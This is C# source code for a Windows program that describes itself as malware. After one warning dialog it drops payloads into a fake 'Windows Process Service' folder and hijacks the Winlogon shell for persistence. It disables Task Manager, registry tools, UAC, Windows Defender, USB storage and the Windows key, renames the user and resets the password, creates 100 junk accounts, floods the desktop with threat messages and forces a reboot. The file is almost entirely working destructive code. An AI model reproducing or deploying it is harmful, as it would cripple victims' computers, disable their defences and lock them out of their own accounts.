/* ソースコードは人に見せる用として制作していないためとても散らかっていて汚いです */
/* and if this src causes damage to ur computer, all you own risk! */

using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using Microsoft.Win32;
using static INT86x.functions;

namespace INT86x
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.shake_button.Interval = 10;
            this.shake_button.Tick += new EventHandler(shake_button_Tick);
            this.shake.Interval = 10;
            this.shake.Tick += new EventHandler(shake_Tick);
            this.shake.Start();
            done.Hide();
        }

        private Random random = new Random();
        //private readonly static string exefolder = Directory.GetCurrentDirectory();

        byte[] hax_value = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x35, 0x00,
0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00,
0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x00, 0x00, 0x30, 0x00,
0x00, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x21, 0x00,
0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x24, 0x00,
0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x13, 0x00,
0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x11, 0x00,
0x00, 0x00, 0x2D, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00, 0x5B, 0xE0, 0x00, 0x00, 0x00, 0x00
 };

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private void button1_Click(object sender, EventArgs e)
        {
            string delete = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Process Service");
            Directory.Delete(delete, true);
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Hide();
            if (MessageBox.Show("This malware is no joke. are you continue?", "THE LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2, MessageBoxOptions.ServiceNotification) == DialogResult.No)
            {
                this.Show();
            }
            else
            {
                x86();
            }
        }

        public void x86()
        {
            //e.Cancel = true;
            done.Text = "=2";
            /*
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            RegistryKey reg_explo = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_explo.SetValue("Shell", "explorer.exe, C:\\Program Files\\INT86.exe", RegistryValueKind.String);
            RegistryKey reg_color = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg_color.SetValue("AutoColorization", 1, RegistryValueKind.DWord);
            reg_color.SetValue("WallPaper", @"C:\\Program Files\\apr_.png", RegistryValueKind.String);
            RegistryKey reg_swap = Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse");
            reg_swap.SetValue("SwapMouseButtons", "1", RegistryValueKind.String);
            RegistryKey reg_logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_logon.SetValue("shutdownwithoutlogon", 0, RegistryValueKind.DWord);
            RegistryKey reg_title = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            reg_title.SetValue("UseDefaultTile", 1, RegistryValueKind.DWord);
            RegistryKey reg_dlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            reg_dlogon.SetValue("DisableLogonBackgroundImage", 1, RegistryValueKind.DWord);
            RegistryKey reg_winlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_winlogon.SetValue("AutoRestartShell", 0, RegistryValueKind.DWord);
            //reg_winlogon.SetValue("DisableCAD", 1, RegistryValueKind.DWord);
            RegistryKey reg_uac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_uac.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            */

            /*
            string Directory86 = "C:\\Program Files\\Windows Process Service";
            string UserPath = "C:\\ProgramData\\Microsoft\\User Account Pictures";
            Directory.CreateDirectory(Directory86);

            Extract("INT86x", Directory86, "Resources", "apr_.png");
            Extract("INT86x", Directory86, "Resources", "INT86.exe");
            Extract("INT86x", UserPath, "Resources", "guest.png");
            Extract("INT86x", UserPath, "Resources", "user.png");
            Extract("INT86x", UserPath, "Resources", "user-192.png");
            Extract("INT86x", UserPath, "Resources", "user-48.png");
            Extract("INT86x", UserPath, "Resources", "user-40.png");
            Extract("INT86x", UserPath, "Resources", "user-32.png");
            Extract("INT86x", UserPath, "Resources", "guest.bmp");
            Extract("INT86x", UserPath, "Resources", "user.bmp");
            */
            string Directory86 = "C:\\Program Files\\Windows Process Service";
            string UserPath = "C:\\ProgramData\\Microsoft\\User Account Pictures";
            Directory.CreateDirectory(Directory86);

            Extract("INT86x", Directory86, "Resources", "apr_.png");    //Wallpaper
            Extract("INT86x", Directory86, "Resources", "INT86.exe");    //Date Payload
            Extract("INT86x", Directory86, "Resources", "Console.exe");    //Payload Console
            
            //User Icon Picuture
            
            Extract("INT86x", UserPath, "Resources", "guest.png");
            Extract("INT86x", UserPath, "Resources", "user.png");
            Extract("INT86x", UserPath, "Resources", "user-192.png");
            Extract("INT86x", UserPath, "Resources", "user-48.png");
            Extract("INT86x", UserPath, "Resources", "user-40.png");
            Extract("INT86x", UserPath, "Resources", "user-32.png");
            Extract("INT86x", UserPath, "Resources", "guest.bmp");
            Extract("INT86x", UserPath, "Resources", "user.bmp");
            
            cmd_func.cmd("taskkill", "/f /im taskmgr.exe");
            cmd_func.cmd("taskkill", "/f /im ProcessHacker.exe");
            cmd_func.cmd("taskkill", "/f /im regedit.exe");
            //cmd_func.cmd("taskkill", "/f /im cmd.exe");

            /* register startup INT86 */
            string startupPath = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
            string startupValueName = "Shell";
            string newValue = "explorer.exe, C:\\Program Files\\Windows Process Service\\INT86.exe";

            Registry.SetValue(startupPath, startupValueName, newValue, RegistryValueKind.String);

            RegistryKey reg_scancode = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout");
            reg_scancode.SetValue("Scancode Map", hax_value, RegistryValueKind.Binary);
            RegistryKey reg_explo = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_explo.SetValue("Shell", "explorer.exe, C:\\Program Files\\Windows Process Service\\INT86.exe", RegistryValueKind.String);
            RegistryKey wallpaperstyle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            wallpaperstyle.SetValue("WallpaperStyle", "2");
            RegistryKey noremovewall = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
            noremovewall.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);
            RegistryKey swap = Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse");
            swap.SetValue("SwapMouseBUttons", "1", RegistryValueKind.String);
            RegistryKey color = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            color.SetValue("AutoColorization", "1", RegistryValueKind.DWord);
            RegistryKey reg_logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_logon.SetValue("shutdownwithoutlogon", 0, RegistryValueKind.DWord);
            RegistryKey reg_title = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            reg_title.SetValue("UseDefaultTile", 1, RegistryValueKind.DWord);
            RegistryKey reg_dlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            reg_dlogon.SetValue("DisableLogonBackgroundImage", 1, RegistryValueKind.DWord);
            RegistryKey reg_winlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_winlogon.SetValue("AutoRestartShell", 0, RegistryValueKind.DWord);
            RegistryKey logonmsgtitle = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system", true);
            logonmsgtitle.SetValue("legalnoticecaption", "OS has changed to 86x.sys");
            RegistryKey logonmsg = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system", true);
            logonmsg.SetValue("legalnoticetext", "86x.sys Message: YOU ARE BEING WATCHED BY System86x.");

            RegistryKey winkey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            winkey.SetValue("NoWinKeys", 1);
            RegistryKey usb = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\usbstor");
            usb.SetValue("Start", 4);
            RegistryKey defender = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
            defender.SetValue("DisableAntiSpyware", 1);

            RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            keyUAC.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            cmd_func.cmd("cmd.exe", @"/k wmic useraccount where name ='%username%' rename " + "86x" +
            @" && net user System13 System13 && exit");
            cmd_func.cmd("cmd.exe", @"/k wmic useraccount where name='%username%' set FullName='86x'");
            cmd_func.cmd("cmd.exe", @"/k wmic useraccount where name='%username%' rename '86x'");
            cmd_func.cmd("cmd.exe", @"/k net user %username% 86");
            copy_user();
            for (int num = 0; num < 100; num++)
            {
                cmd_func.cmd("cmd.exe", @"/k net user " + Generator_char.gen() + " " + Generator_char.gen() + @" /add && exit");
                Thread.Sleep(10);
            }
            for (int i = 1; i <= 200; i++)
            {
                string fileName = Generator_char.gen();
                string fileContent = "YOU ARE BEING WATCHED BY System86x.\r\nTHERE IS NO ESCAPE NOW.\r\n    ";
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + fileName, fileContent);
                Thread.Sleep(10);
            }

            SystemParametersInfo(0x14, 0, @"C:\Program Files\Windows Process Service\apr_.png", 0x01 | 0x02);

            Thread.Sleep(5000);

            cmd_func.cmd("shutdown.exe", "/r /t 0 /f");

        }

        public void copy_user()
        {
            string sourceDirectory = @"C:\Program Files\Windows Process Service\";

            string targetDirectory = @"C:\ProgramData\Microsoft\User Account Pictures\";

            string[] fileNames = { "guest.bmp", "guest.png", "user-192.png", "user-32.png",
                                       "user-40.png", "user-48.png", "user.bmp", "user.png" };

            foreach (string fileName in fileNames)
            {
                string sourceFilePath = Path.Combine(sourceDirectory, fileName);
                string targetFilePath = Path.Combine(targetDirectory, fileName);

                File.Copy(sourceFilePath, targetFilePath, true);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (done.Text == "=2")
            {
                e.Cancel = true;
            }
            else
            {
                e.Cancel = false;

            }
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            //this.shake_button.Start();

        }

        private void shake_button_Tick(object sender, EventArgs e)
        {
            int deltaX = random.Next(-3, 4);
            int deltaY = random.Next(-3, 4);

            button2.Location = new Point(button2.Location.X + deltaX, button2.Location.Y + deltaY);

            Thread.Sleep(10);

            button2.Location = new Point(241, 237);
        }

        private void button2_MouseEnter(object sender, EventArgs e)
        {
            this.shake_button.Start();

        }

        private void button2_MouseLeave(object sender, EventArgs e)
        {
            this.shake_button.Stop();

        }

        private void button1_MouseMove(object sender, MouseEventArgs e)
        {

        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            //this.shake_button.Stop();

        }

        private void done_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void shake_Tick(object sender, EventArgs e)
        {
            int deltaX = random.Next(-1, 2);
            int deltaY = random.Next(-1, 2);

            pictureBox1.Location = new Point(pictureBox1.Location.X + deltaX, pictureBox1.Location.Y + deltaY);

            Thread.Sleep(10);

            pictureBox1.Location = new Point(1, 2);
        }
    }
}
